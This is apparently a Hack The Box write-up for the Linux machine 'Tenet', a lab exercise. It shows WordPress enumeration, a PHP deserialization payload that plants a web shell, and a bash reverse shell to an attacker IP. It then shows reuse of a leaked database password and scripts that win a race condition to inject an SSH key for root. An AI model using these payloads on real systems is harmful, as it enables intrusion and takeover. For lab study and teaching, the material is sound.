@@ -1,0 +1,650 @@
+Tenet - Hack The Box - Linux Medium
+
+Gobuster
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $gobuster dir -u http://10.10.10.223 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.223
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/06/13 19:15:44 Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 277]
+/.php                 (Status: 403) [Size: 277]
+/.htm                 (Status: 403) [Size: 277]
+/.                    (Status: 200) [Size: 10918]
+/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.223/wordpress/]
+/.htaccess            (Status: 403) [Size: 277]                                     
+/.phtml               (Status: 403) [Size: 277]                   
+=====================================================================================================================================
+
+We find a wordpress page based on gobuster
+http://10.10.10.223/wordpress/
+
+We look at the source code and notice that it is trying to reach tenet.htb so we add that name to our hosts file.
+
+We now get the wordpress page with all it's content.
+
+We can now got to wp-admin and try admin admin to login, we get redirected
+http://tenet.htb/wp-login.php?redirect_to=http%3A%2F%2Ftenet.htb%2Fwp-admin%2F&reauth=1
+
+We can also go to wp-content to check for index.html files, we can posibly enumerate to wp-content/plugins
+http://tenet.htb/wp-content/
+
+Will now use wp-scan
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $wpscan --url http://tenet.htb -e ap --plugins-detection aggressive -o wpscan.out
+=====================================================================================================================================
+
+We can also manually enumerate word press, for example opening up a post and see the authors and get usernames, we can also enumerate
+
+http://tenet.htb/index.php/author/protagonist/
+
+The url above is a wrapper for the following
+http://tenet.htb/index.php?author=1
+
+It will just redirect us to:
+http://tenet.htb/index.php/author/protagonist/
+
+We can then just use curl and check the header info.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I http://tenet.htb/index.php?author=1
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 14 Jun 2021 16:51:49 GMT
+Server: Apache/2.4.29 (Ubuntu)
+X-Redirect-By: WordPress
+Location: http://tenet.htb/index.php/author/protagonist/
+Content-Type: text/html; charset=UTF-8
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I http://tenet.htb/index.php?author=2
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 14 Jun 2021 16:52:12 GMT
+Server: Apache/2.4.29 (Ubuntu)
+X-Redirect-By: WordPress
+Location: http://tenet.htb/?author=2
+Content-Type: text/html; charset=UTF-8
+
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I http://tenet.htb/index.php?author=3
+HTTP/1.1 301 Moved Permanently
+Date: Mon, 14 Jun 2021 16:52:14 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Redirect-By: WordPress
+Location: http://tenet.htb/?author=3
+Content-Type: text/html; charset=UTF-8
+
+=====================================================================================================================================
+
+However no authors are found, however there are 2 users on the box. If we looked at the posts and go to the Migration Blog Post
+you will see a user named neil that has a comment on tha blog that is pretty useful.
+
+This author doesn't show up since the user does not have a blog post, this author thing only works if the person had a blog post.
+
+He also talks the sator php file and the backup we can use curl to quickly check if the file exists or not
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I http://tenet.htb/sator.php
+HTTP/1.1 404 Not Found
+Date: Mon, 14 Jun 2021 16:56:10 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Type: text/html; charset=iso-8859-1
+
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I http://10.10.10.223/sator.php
+HTTP/1.1 200 OK
+Date: Mon, 14 Jun 2021 16:56:19 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+=====================================================================================================================================
+
+Based on the header info we come to find that the php file sator does exist but not on with the tenet name specified as host and 
+instead just works with an IP.
+
+So the file does not exist in wordpress.
+Commands and Output:
+=====================================================================================================================================
+[+] Grabbing users from text file
+[] Database updated
+=====================================================================================================================================
+
+We can search for the backup file using gobuster.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $gobuster dir -u http://10.10.10.223 -w words -d -x php -o gobuster.out
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.223
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                words
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/06/14 09:59:27 Starting gobuster in directory enumeration mode
+===============================================================
+/sator.php.bak        (Status: 200) [Size: 514]
+/sator.php            (Status: 200) [Size: 63] 
+=====================================================================================================================================
+
+The "-d" is a discover feature that allows us to search for backups with different permutations such as ".sator.php", ".sator.php.bak
+this as well as vimswap files in our case we just found the backup with .bak
+
+Commands and Output:
+=====================================================================================================================================
+wget 10.10.10.223/sator.php.bak
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+<?php
+
+class DatabaseExport
+{
+	public $user_file = 'users.txt';
+	public $data = '';
+
+	public function update_db()
+	{
+		echo '[+] Grabbing users from text file <br>';
+		$this-> data = 'Success';
+	}
+
+
+	public function __destruct()
+	{
+		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
+		echo '[] Database updated <br>';
+	//	echo 'Gotta get this working properly...';
+	}
+}
+
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -> update_db();
+
+
+?>
+
+=====================================================================================================================================
+
+There is no reason to do serialization other than let it be vulnerable.
+We can now create a serialized object with a snippet of that code and write it to pwn.php
+
+Commands and Output:
+=====================================================================================================================================
+<?php
+
+class DatabaseExport
+{
+	public $user_file = 'users.txt';
+	public $data = '';
+
+}
+
+$pwn = new DatabaseExport;
+echo (serialize($pwn));
+
+..
+..
+..
+
+
+O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:0:"";}
+=====================================================================================================================================
+
+We will create a php file and give it code to execute as a serialized object
+Commands and Output:
+=====================================================================================================================================
+<?php
+
+class DatabaseExport
+{
+	public $user_file = 'test.php';
+    public $data = '<?php system($_REQUEST["cmd"]); ?> ';
+
+}
+
+$pwn = new DatabaseExport;
+echo (serialize($pwn));
+
+
+..
+..
+..
+
+O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"test.php";s:4:"data";s:35:"<?php system($_REQUEST["cmd"]); ?> ";}
+=====================================================================================================================================
+
+Now all we need to do is go the url and use the arepo variable and give it the payload that was printed out.
+Commands and Output:
+=====================================================================================================================================
+http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"test.php";s:4:"data";s:35:"<?php system($_REQUEST["cmd"]); ?> ";}
+..
+..
+..
+[+] Grabbing users from text file
+[] Database updated
+[] Database updated
+=====================================================================================================================================
+
+We get output that the database was updated, we can now check if the php file was created through the serialization.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $curl -I 10.10.10.223/test.php
+HTTP/1.1 200 OK
+Date: Mon, 14 Jun 2021 17:22:49 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+
+=====================================================================================================================================
+
+Indeed it was, we can try and exeute commands
+Commands and Output:
+=====================================================================================================================================
+http://10.10.10.223/test.php?cmd=id
+
+..
+..
+..
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+=====================================================================================================================================
+
+We can now attempt to create a reverse shell.
+Commands and Output:
+=====================================================================================================================================
+10.10.10.223/test.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.28/9001 0>&1'
+
+URL Encoded:
+http://10.10.10.223/test.php?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%32%38%2f%39%30%30%31%20%30%3e%26%31%27
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.223.
+Ncat: Connection from 10.10.10.223:62228.
+bash: cannot set terminal process group (1638): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@tenet:/var/www/html$ 
+
+=====================================================================================================================================
+
+After getting a shell we can run sudo -l and see if there is anything we can run on the box as a privilged user.
+Commands and Output:
+=====================================================================================================================================
+www-data@tenet:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on tenet:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+User www-data may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+=====================================================================================================================================
+
+After that we can also check the wordpress directory and look at the databse files.
+We ae able to find in the wordpress directory wp-config.php which contains the database username and password for user
+Commands and Output:
+=====================================================================================================================================
+..
+..
+..
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'neil' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'Opera2112' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+..
+..
+..
+=====================================================================================================================================
+
+We can now try and switch the neil user and use the creds found and it works with Opera2112
+Commands and Output:
+=====================================================================================================================================
+..
+..
+
+www-data@tenet:/var/www/html/wordpress$ su - neil
+Password: 
+neil@tenet:~$
+..
+..
+..
+=====================================================================================================================================
+
+Another thing we could have done if the cred wasn't that one is look a the database using mysql.
+Commands and Output:
+=====================================================================================================================================
+www-data@tenet:/var/www/html/wordpress$ mysql -u neil -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 36
+Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec)
+
+mysql> select * from wp_users;
++----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login  | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |
++----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. | protagonist   | protagonist@tenet.htb | http://10.10.10.44/wordpress | 2020-12-16 12:17:10 |                     |           0 | protagonist  |
+|  2 | neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. | neil          | neil@tenet.htb        | http://tenet.htb             | 2020-12-16 14:51:26 |                     |           0 | neil neil    |
++----+-------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+
+2 rows in set (0.00 sec)
+
+mysql> select user_login,user_pass from wp_users;
++-------------+------------------------------------+
+| user_login  | user_pass                          |
++-------------+------------------------------------+
+| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
+| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
++-------------+------------------------------------+
+2 rows in set (0.00 sec)
+
+=====================================================================================================================================
+
+That way could find all the usernames and hashes which we could then crack with hashcat.
+
+We can now ssh with the cred to have a more stable shell. Using sudo -l, we can also see that neil can run enable.ssh
+Commands and Output:
+=====================================================================================================================================
+neil@tenet:~$ sudo -l
+Matching Defaults entries for neil on tenet:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+User neil may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+=====================================================================================================================================
+
+We can now look at the script which is running as root. We have multiple functions. Add_key() will make a file in temp with a umask
+of 110. Making new permissions of files 667, it will echo the key into tmpname. It will run checkfile. 
+
+There is a race condition within the function, if we replace the contents of the file beofre it gets checked it will put the contents
+of whatever we can overwrite into the ssh Authorized keys for root.
+
+We can do this 2 different ways through brute force. We will write quick script within tmp looping and looking for files and once to
+overwrite the files with our own contents.
+Commands and Output:
+=====================================================================================================================================
+neil@tenet:/tmp$ cat brute.sh 
+#!/bin/bash
+while true; do
+	for file in $(ls);do
+		if [[ $file == 	ssh* ]]; then
+			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCphFnZcFRzXAr86+9rZqEyn8/QqABKMBzxRLk29pJZenlXvtQ3R7xzh0n3TCxqCn50e1WMwPhsrGrvtXg3U89kaU2MRPjZBFc0Fwfgl38ZT0KnRG49s/iKTGVNvnX88BP558D8AkSRvfLYUxz/ZU3QQLrZlNhkrv57BG7BkkDPwm2jVd8Z0Ryb7I45/09yYJrs9R0vJrpupOSuEpvjPSnJS2KhVyET/+oZxb8zaNyJP6DDpg+U9cD7JW+hyeTyG/yg6UwpRXj+1DkwnZV2CuX8x8fBnNj3lXrnzkGrJeIFWgrAm7twlE+K5V6+JGVTZmoSGx7gkeWx77+l0G08m7qc5G21GambbebUfiZD2zY+380mNozQthMFADpVyJUkWGLIy46aiQ0q5giID/Lm/y9uv4sY3kZET5Pc7TTv3VemDq0UPuIVVOxwokHX+HrqNVJbZz2k9XdhH+zZc7jqbmpJD2vyKB4co2lqBec0rqCrQpCE4yhY7cpmHo2sOfNNY9U=" > $file;
+		fi
+	done
+done
+=====================================================================================================================================
+
+We now create another session so we can run the sudo command while we let brute running.
+Commands and Output:
+=====================================================================================================================================
+neil@tenet:/tmp$ ./brute.sh
+..
+..
+..
+
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Successfully added root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Error in adding root@ubuntu to authorized_keys file!
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Successfully added root@ubuntu to authorized_keys file!
+
+..
+..
+..
+
+└──╼ $ssh root@10.10.10.223 -i tenet 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jun 14 18:55:09 UTC 2021
+
+  System load:  0.37               Processes:             185
+  Usage of /:   15.3% of 22.51GB   Users logged in:       1
+  Memory usage: 12%                IP address for ens160: 10.10.10.223
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+53 packages can be updated.
+31 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Feb 11 14:37:46 2021
+root@tenet:~# 
+=====================================================================================================================================
+
+We have to wait a while and run the sudo commands multiple times since it is a race condition. But in the end we are able to get root.
+With no issues we get in, this is a pretty sloppy way of getting root through the brute.sh script. Instead we can use inotify in 
+linux to verify when there is a change.
+
+We can do this through a C prgram instead of using python since the necessary libraries are not installed.
+We google and find the following sites:
+https://www.thegeekstuff.com/2010/04/inotify-c-program-example/
+https://linuxhint.com/inotify_api_c_language/
+
+We grab the code in 'inotify.c' and paste it to a file named pwn.c
+We will then modify the code such that when an event is created it will automatically do whatevet action we want to take.
+Attached is the relevant code.
+Commands and Output:
+=====================================================================================================================================
+..
+..
+..
+
+                  if(event->len){
+                   if ( event->mask & IN_CREATE ) {
+                   if ( event->mask & IN_ISDIR ) {
+                     printf( "The directory %s was created.\n", event->name );
+                     }
+                     else {
+                       printf( "The file %s was created.\n", event->name );
+                       FILE *fptr;
+                       char fullname[] = "/tmp/";
+                       strcat(fullname, event->name);
+                       fptr = fopen(fullname, "w");
+                       fprintf(fptr, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCphFnZcFRzXAr86+9rZqEyn8/QqABKMBzxRLk29pJZenlXvtQ3R7xzh0n3TCxqCn50e1WMwPhsrGrvtXg3U89kaU2MRPjZBFc0Fwfgl38ZT0KnRG49s/iKTGVNvnX88BP558D8AkSRvfLYUxz/ZU3QQLrZlNhkrv57BG7BkkDPwm2jVd8Z0Ryb7I45/09yYJrs9R0vJrpupOSuEpvjPSnJS2KhVyET/+oZxb8zaNyJP6DDpg+U9cD7JW+hyeTyG/yg6UwpRXj+1DkwnZV2CuX8x8fBnNj3lXrnzkGrJeIFWgrAm7twlE+K5V6+JGVTZmoSGx7gkeWx77+l0G08m7qc5G21GambbebUfiZD2zY+380mNozQthMFADpVyJUkWGLIy46aiQ0q5giID/Lm/y9uv4sY3kZET5Pc7TTv3VemDq0UPuIVVOxwokHX+HrqNVJbZz2k9XdhH+zZc7jqbmpJD2vyKB4co2lqBec0rqCrQpCE4yhY7cpmHo2sOfNNY9U=\n");
+                       fclose(fptr);
+
+                    }
+                    }
+
+..
+..
+..
+=====================================================================================================================================
+
+We compile and copy the bianry over via scp.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tenet]
+└──╼ $gcc -o pwn pwn.c 
+pwn.c: In function ‘main’:
+pwn.c:75:24: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
+   75 |                        strcat(fullname, event->name);
+      |                        ^~~~~~
+pwn.c:75:24: warning: incompatible implicit declaration of built-in function ‘strcat’
+pwn.c:7:1: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
+    6 | #include<fcntl.h> // library for fcntl function
+  +++ |+#include <string.h>
+    7 | 
+
+..
+..
+..
+
+└──╼ $scp pwn neil@10.10.10.223:/tmp
+neil@10.10.10.223's password: 
+pwn                                                                                                     100%   17KB  94.5KB/s   00:0
+=====================================================================================================================================
+
+We change the permissions on the file and run it concurently with the sudo command.
+Commands and Output:
+=====================================================================================================================================
+neil@tenet:/tmp$ ./pwn /tmp
+Watching : /tmp
+The file ssh-QiMDgwq6 was created.
+Segmentation fault (core dumped)
+
+..
+..
+..
+
+neil@tenet:/tmp$ sudo /usr/local/bin/enableSSH.sh
+Successfully added root@ubuntu to authorized_keys file!
+
+..
+..
+..
+
+└──╼ $ssh root@10.10.10.223 -i tenet 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jun 14 19:31:20 UTC 2021
+
+  System load:  0.38               Processes:             185
+  Usage of /:   15.3% of 22.51GB   Users logged in:       1
+  Memory usage: 12%                IP address for ens160: 10.10.10.223
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+53 packages can be updated.
+31 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Jun 14 18:59:25 2021 from 10.10.14.28
+root@tenet:~# 
+=====================================================================================================================================
+
+While we do get a segfault, there is no need to run the command multiple times as it immediately detects the newly created file and
+adds the necessary ssh key to get root.
+
+Commands and Output:
+=====================================================================================================================================
+=====================================================================================================================================
+
